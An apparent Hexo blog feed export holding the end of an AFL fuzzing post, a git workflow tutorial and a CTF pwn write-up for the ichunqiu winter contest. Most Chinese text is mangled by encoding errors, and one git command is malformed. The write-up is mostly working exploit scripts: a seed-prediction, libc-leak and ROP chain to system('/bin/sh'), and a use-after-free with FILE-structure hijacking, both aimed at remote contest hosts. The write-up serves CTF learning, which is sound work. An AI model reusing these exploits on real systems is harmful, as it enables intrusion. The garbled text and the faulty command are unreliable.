<li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ’å…¥ä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ’å…¥åŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ’å…¥ä¸€æ®µéšæœºé€‰å–çš„æ•°</li>
<li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ›¿æ¢ä¸ºä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆåŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆä¸€æ®µéšæœºé€‰å–çš„æ•°</li>
<li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ›¿æ¢</li>
<li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ’å…¥</li>
</ul>
<h2 id="è¦†ç›–ç‡"><a href="#è¦†ç›–ç‡" class="headerlink" title="è¦†ç›–ç‡"></a>è¦†ç›–ç‡</h2><p>å…±äº«å†…å­˜ï¼š<code>MAP_SIZE=64K</code>ï¼Œå½“ç„¶ä¼šå­˜åœ¨ç¢°æ’çš„é—®é¢˜ï¼›ä½†æ ¹æ®AFLæ–‡æ¡£ä¸­çš„ä»‹ç»ï¼Œå¯¹äºä¸æ˜¯å¾ˆå¤æ‚çš„ç›®æ ‡ï¼Œç¢°æ’æ¦‚ç‡è¿˜æ˜¯å¯ä»¥æ¥å—çš„ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      <span class="number">1</span>,<span class="number">000</span> | <span class="number">0.75</span>%            | giflib, lzo</span><br><span class="line">      <span class="number">2</span>,<span class="number">000</span> | <span class="number">1.5</span>%             | zlib, tar, xz</span><br><span class="line">      <span class="number">5</span>,<span class="number">000</span> | <span class="number">3.5</span>%             | libpng, libwebp</span><br><span class="line">     <span class="number">10</span>,<span class="number">000</span> | <span class="number">7</span>%               | libxml</span><br><span class="line">     <span class="number">20</span>,<span class="number">000</span> | <span class="number">14</span>%              | sqlite</span><br><span class="line">     <span class="number">50</span>,<span class="number">000</span> | <span class="number">30</span>%              | -</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸€ä¸ªç›®æ ‡è¿‡äºå¤æ‚ï¼Œé‚£ä¹ˆAFLçŠ¶æ€é¢æ¿ä¸­çš„map_densityä¿¡æ¯å°±ä¼šæœ‰ç›¸åº”çš„æç¤º</p>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼šaflæ˜¯åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒé€šè¿‡è®°å½•è¾“å…¥æ ·æœ¬çš„ä»£ç è¦†ç›–ç‡ï¼Œä»è€Œè°ƒæ•´è¾“å…¥æ ·æœ¬ä»¥æé«˜è¦†ç›–ç‡ï¼Œå¢åŠ å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚ä½†æ˜¯å¦‚æœç¨‹åºå­˜åœ¨ifè¯­å¥ï¼Œå¹¶ä¸”ifè¯­å¥å­˜åœ¨ä¸€å®šçš„æ¡ä»¶ï¼Œç”šè‡³ä¼šå¯¼è‡´æ­»å¾ªç¯ï¼Œå¯¹è¦†ç›–ç‡çš„å½±å“ï¼Ÿ</p>
<p>å¦‚æœç”¨æˆ·æƒ³æä¾›ä¸€ä¸ªåå¤„ç†ç®—æ³•ï¼Œä»…éœ€å°†å…¶å†™è¿› afl_postprocess å‡½æ•°ï¼Œå¹¶ç¼–è¯‘æˆåŠ¨æ€åº“ï¼Œé€šè¿‡ AFL_POST_LIBRARY ç¯å¢ƒå˜é‡ä¼ é€’ç»™ fuzzerã€‚æœ‰ç‚¹åƒæ’ä»¶çš„ä½œç”¨</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul>
<li><a href="https://rk700.github.io/2017/12/28/afl-internals/">AFLå†…éƒ¨å®ç°ç»†èŠ‚å°è®°</a></li>
<li><a href="https://eternalsakura13.com/2020/08/23/afl/">sakuraã®AFLæºç å…¨æ³¨é‡Š</a></li>
<li><a href="https://hicookie.me/2019/09/18/AFL-Learning/">AFL-Learning</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>#Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>git-work-flows</title>
    <url>/2023/11/20/git%20work-flow/</url>
    <content><![CDATA[<blockquote>
<p>gitå·¥ä½œæµï¼ŒæŒç»­è¸©å‘</p>
</blockquote>
<span id="more"></span>

<p>å› ä¸ºæˆ‘åŒæ—¶ä½¿ç”¨ä¸¤ä¸ªæ“ä½œæ˜”æ—¥ï¼Œå› æ­¤githubä»“åº“å°±äº§ç”Ÿä¸€ä¸ªåŒæ­¥çš„é—®é¢˜ã€‚ä½†æ˜¯åªä¼š <code>add commit push</code> ä¸‰æ­¥ï¼Œå› æ­¤å­¦ä¹ ä¸€ä¸‹</p>
<p>å·¥ä½œåŒºï¼šæœ¬åœ°æ–‡ä»¶ã€‚git clone ä¸‹è½½åˆ°å·¥ä½œåŒºï¼Œgit pull æ›´æ–°åˆ°å·¥ä½œåŒº<br>æš‚å­˜åŒºï¼šadd æäº¤åˆ°æš‚å­˜åŒºã€‚<br>æœ¬åœ°ä»“åº“ï¼š commit æäº¤åˆ°æœ¬åœ°ä»“åº“ã€‚fetch ä»è¿œç¨‹æ›´æ–°åˆ°æœ¬åœ°ä»“åº“<br>è¿œç¨‹ä»“åº“ï¼špush æäº¤åˆ°è¿œç¨‹ä»“åº“ã€‚</p>
<h2 id="å·¥ä½œæµ"><a href="#å·¥ä½œæµ" class="headerlink" title="å·¥ä½œæµ"></a>å·¥ä½œæµ</h2><ol>
<li>git clone ååˆ‡æ¢åˆ†æ”¯</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;remote&gt;</span><br><span class="line">git checkout -b feature/windows</span><br><span class="line">git branch -a</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>å†™ç‚¹ä¸œè¥¿æäº¤</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æäº¤åˆ°æœ¬åœ°</span></span><br><span class="line">git diff     <span class="comment"># æœ¬åœ°ä»“åº“å’Œæœ¬åœ°å·¥ä½œåŒºæ–‡ä»¶çš„diff</span></span><br><span class="line">git add xxx</span><br><span class="line">git commit   <span class="comment"># ä½¿ç”¨ vim å†™ commit ä¿¡æ¯ </span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>push åˆ°ä»“åº“</li>
</ol>
<ul>
<li>ç»è¿‡è¿™ä¸€æ­¥ï¼Œä»“åº“åº”è¯¥å­˜åœ¨ä¸¤ä¸ªbranch</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ†æ”¯åŒæ­¥ï¼šmain åˆ†æ”¯</span></span><br><span class="line">git checkout main</span><br><span class="line">git fetch origin</span><br><span class="line">git diff</span><br><span class="line">git pull origin main</span><br><span class="line">git checkout feature/windows</span><br><span class="line"></span><br><span class="line"><span class="comment"># rebase: å…ˆåˆå¹¶mainåˆ†æ”¯commitï¼Œåœ¨åˆå¹¶æœ¬åœ°çš„commit</span></span><br><span class="line">git rebase main</span><br><span class="line">git push -f origin feature/windows</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>main è¿œç¨‹åˆ†æ”¯åˆå¹¶</li>
</ol>
<ul>
<li>åœ¨ github ç±»ä¼¼çš„åœ°æ–¹æäº¤ä¸€ä¸ª <code>pr(pull request)</code>ï¼Œå°† <code>feature/windows</code> åˆå¹¶åˆ° <code>main</code> åˆ†æ”¯é‡Œ</li>
<li>ç»è¿‡é¡¹ç›®å¼€å‘è€…å®¡æŸ¥ï¼Œä¼šè¿›è¡Œåˆå¹¶ã€‚</li>
<li>åˆ é™¤è¿œç«¯ <code>feature/windows</code> </li>
<li>åˆ é™¤æœ¬åœ°åˆ†æ”¯</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git branch -D feature/windows</span><br><span class="line"><span class="comment"># æœ€åéœ€è¦æˆ‘ä»¬åœ¨è¿›è¡Œåˆå¹¶ä¸€ä¸‹</span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<p>å› æ­¤åˆ›å»ºä¸‰ä¸ªåˆ†æ”¯æ¥ç»´æŠ¤ã€‚</p>
<h2 id="å­æ¨¡å—"><a href="#å­æ¨¡å—" class="headerlink" title="å­æ¨¡å—"></a>å­æ¨¡å—</h2><ol>
<li>å°†å­æ¨¡å—æ–‡ä»¶å¤¹åŠ å…¥åˆ°Â <code>.gitignore</code>Â æ–‡ä»¶å†…å®¹ä¸­ï¼Œè¿™æ ·ä¸»é¡¹ç›®å°±èƒ½å¤Ÿæ— è§†å­é¡¹ç›®çš„å­˜åœ¨ã€‚</li>
<li>git submodule ä½¿ç”¨</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°†ä»“åº“cloneä¸‹æ¥ï¼Œå‡ºç°ä¸€ä¸ª .submodule æ–‡ä»¶</span></span><br><span class="line">git submodule add https://github.com/chaconinc/DbConnector</span><br><span class="line"></span><br><span class="line">git submodule update --remote &lt;repo&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ç‰ˆæœ¬å›é€€"><a href="#ç‰ˆæœ¬å›é€€" class="headerlink" title="ç‰ˆæœ¬å›é€€"></a>ç‰ˆæœ¬å›é€€</h2><p>æœ€æ–°çš„ä¸ä¸€å®šæ˜¯æœ€å¥½çš„ï¼Œè¿˜å¯èƒ½æ˜¯bug å¤šå¤šçš„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a  <span class="comment"># å…ˆæŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰çš„é¡¹ç›®æ¯”è¾ƒå­˜åœ¨ä¸åŒçš„tag</span></span><br><span class="line">git checkout &lt;branch&gt; &lt;tag&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ‰çš„é¡¹ç›®å­˜åœ¨ç‰ˆæœ¬ åˆ†æ”¯</span></span><br><span class="line">git checkout &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit å›é€€</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git checkout &lt;comit_hash&gt;</span><br></pre></td></tr></table></figure>


<h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> -r --cached &lt;<span class="built_in">dir</span>/filename&gt;</span><br><span class="line">git commit -m <span class="string">&quot;delete&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç°åœ¨æ¯”è¾ƒå¥½çš„IDEåªéœ€è¦ç‚¹å‡»ä¸€ä¸‹é¼ æ ‡å°±è¡Œï¼Œä¹Ÿæ˜¯å¾ˆæ–¹ä¾¿ã€‚</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>ichunqiuå†¬å­£èµ›</title>
    <url>/2024/01/28/ichunqiu%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<blockquote>
<p>æ˜¥ç§‹æ¯ å†¬å­£èµ›</p>
</blockquote>
<span id="more"></span>
<h2 id="nmanager"><a href="#nmanager" class="headerlink" title="nmanager"></a>nmanager</h2><ol>
<li>éšæœºæ•°æ¯”è¾ƒï¼Œä½†æ˜¯1s ç›¸å¯¹ç¨‹åºæ¥è¯´å¾ˆæ’‘ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°å…¶seed</li>
<li>æ•°ç»„è¶Šç•Œå¯¼è‡´çš„æ ˆæº¢å‡ºï¼Œå¾€æ ˆä¸Šå†™å†…å®¹ã€‚</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">modify</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;## select the idx you want modify ##&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gender: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n], <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;age: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">32</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>], <span class="number">64uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;[idx%d]:\nname: %s\nage: %lld\ngender: %s\n&quot;</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)n,</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>],</span><br><span class="line">      *(_QWORD *)&amp;a1[<span class="number">120</span> * n + <span class="number">32</span>],</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;quit now?(Y/y)&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( buf[<span class="number">0</span>] != <span class="string">&#x27;y&#x27;</span> &amp;&amp; buf[<span class="number">0</span>] != <span class="string">&#x27;Y&#x27;</span> );</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>expå¦‚ä¸‹</p>
<ul>
<li>æ ˆä¸Šæœ‰ä¸ªgotè¡¨ï¼Œæœ¬æ¥æ˜¯æƒ³æ³„éœ²è¿™ä¸ªï¼Œä½†æ˜¯åœ¨æ ˆä¸Šçš„ä½ç½®ä¼šå˜ã€‚åæ¥ç›´æ¥æ³„éœ²è¿”å›åœ°å€äº†ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p, cmd=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;nmanager_patched&quot;</span></span><br><span class="line">clib = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment"># context.timeout = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line">ip, port = <span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">43714</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">seed = clib.time(<span class="number">0</span>)</span><br><span class="line">clib.srand(seed)</span><br><span class="line">table = <span class="built_in">list</span>(<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>)</span><br><span class="line">num = clib.rand() % <span class="number">62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input password: &quot;</span>, table[num].encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x29d90</span></span><br><span class="line"><span class="keyword">assert</span>(libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc =&gt; %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi; ret&quot;</span>)).__next__()</span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = libc.sym.system</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">og = libc.address + <span class="number">0xebcf8</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="built_in">str</span>(system))</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>UAF libc2.35ï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰æ²™ç®±ï¼Œç›´æ¥ä½¿ç”¨ <code>house of apple</code></p>
<ul>
<li>è¿˜å¯ä»¥åŠ«æŒçš„ <code>tls_dtor_list</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="function">python3</span></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">s</span><span class="params">(data)</span>:</span></span><br><span class="line"><span class="function">    return p.send(data)</span></span><br><span class="line"><span class="function">def sa(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendafter(delim, data)</span></span><br><span class="line"><span class="function">def sl(data):</span></span><br><span class="line"><span class="function">    return p.sendline(data)</span></span><br><span class="line"><span class="function">def sla(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendlineafter(delim, data)</span></span><br><span class="line"><span class="function">def r(num=</span><span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recv</span>(num)</span><br><span class="line">def <span class="built_in">ru</span>(delim, drop=False):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvuntil</span>(delim, drop)</span><br><span class="line">def <span class="built_in">rl</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvline</span>(timeout=<span class="number">1</span>)</span><br><span class="line">def <span class="built_in">itr</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">interactive</span>()</span><br><span class="line">def <span class="built_in">lg</span>(name):</span><br><span class="line">    <span class="keyword">return</span> log.<span class="built_in">success</span>(<span class="string">&quot;\033[32m%s ==&gt; 0x%x\033[0m&quot;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line">def <span class="built_in">uu64</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">uu32</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u32</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].<span class="built_in">ljust</span>(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">itob</span>(num):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).<span class="built_in">encode</span>()</span><br><span class="line">def <span class="built_in">dbg</span>(p, cmd=<span class="string">&quot;&quot;</span>):</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p, cmd)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">menu</span>(c):</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;&gt; &quot;</span>, <span class="built_in">itob</span>(c))</span><br><span class="line">def <span class="built_in">new</span>(idx, sz):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;what size :&quot;</span>, <span class="built_in">itob</span>(sz))</span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">edit</span>(idx, con):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = <span class="built_in">ELF</span>(file, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.<span class="built_in">process</span>()</span><br><span class="line">ip, port = <span class="string">&quot;8.147.135.190&quot;</span>, <span class="number">24343</span></span><br><span class="line">p = <span class="built_in">remote</span>(ip, port)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">10</span>, <span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">1</span>, <span class="number">0x28</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">0</span>)</span><br><span class="line">leak = <span class="built_in">uu64</span>()</span><br><span class="line"></span><br><span class="line">libc.address = leak - <span class="number">0x219ce0</span></span><br><span class="line">system = libc.sym.system</span><br><span class="line">bin_sh = libc.<span class="built_in">search</span>(b<span class="string">&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">1</span>)</span><br><span class="line">heap_base = <span class="built_in">u64</span>(<span class="built_in">r</span>(<span class="number">5</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">new</span>(<span class="number">11</span>, <span class="number">0x438</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line">payload = <span class="built_in">flat</span>(&#123;</span><br><span class="line">    <span class="number">0x18</span>: IO_list_all - <span class="number">0x20</span></span><br><span class="line">&#125;, filler = b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">0</span>, payload)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">12</span>, <span class="number">0x438</span>)  # IO_list_all =&gt; chunk <span class="number">2</span></span><br><span class="line"></span><br><span class="line"># <span class="meta"># house of apple v2ï¼Œchange _IO_list_all</span></span><br><span class="line">fs = <span class="built_in">FileStructure</span>()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xb80</span>  # chunk4</span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">wdata = <span class="built_in">fit</span>(&#123;</span><br><span class="line">    <span class="number">0xe0</span><span class="number">-0x10</span>: heap_base + <span class="number">0xb80</span> + <span class="number">0xe0</span> + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">4</span>, wdata)</span><br><span class="line"># _IO_wfile_overflow</span><br><span class="line"></span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">edit</span>(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + b<span class="string">&quot;     sh;&quot;</span>)</span><br><span class="line"><span class="built_in">menu</span>(<span class="number">5</span>)</span><br><span class="line"><span class="meta"># dbg(p)</span></span><br><span class="line"><span class="built_in">itr</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="HouseofSome"><a href="#HouseofSome" class="headerlink" title="HouseofSome"></a>HouseofSome</h2><p>ç»™å‡ºglibc2.38 patchæ–‡ä»¶ï¼špatchäº† <code>_IO_wide_data</code> çš„ <strong>è™šè¡¨æ£€æŸ¥</strong>ï¼Œå¸¸è§çš„ house of æŠ€æœ¯æ— æ³•ä½¿ç”¨</p>
